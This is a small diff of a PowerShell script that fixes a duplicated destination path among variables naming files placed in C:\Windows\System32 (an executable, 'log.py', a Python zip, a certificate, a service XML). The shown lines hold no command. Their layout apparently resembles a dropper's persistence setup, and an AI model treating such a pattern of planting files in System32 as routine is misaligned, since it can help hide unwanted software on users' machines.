@@ -7,7 +7,7 @@ $run = Join-Path $env:APPDATA "run.ps1"
 $destino = 'C:\Windows\System32\Int-service.exe'
 $destino2 = 'C:\Windows\System32\ap32\log.py'
 $destino3 = 'C:\Windows\System32\re-as\WPy64.zip'
-$destino4 = 'C:\Windows\System32\re-as\WPy64.zip'
+$destino4 = 'C:\Windows\System32\re-as\WPy64_2.zip'
 $destino5 = 'C:\Windows\System32\ap32\cert.pem'
 $destino6 = 'C:\Windows\System32\Int-service.xml'
 
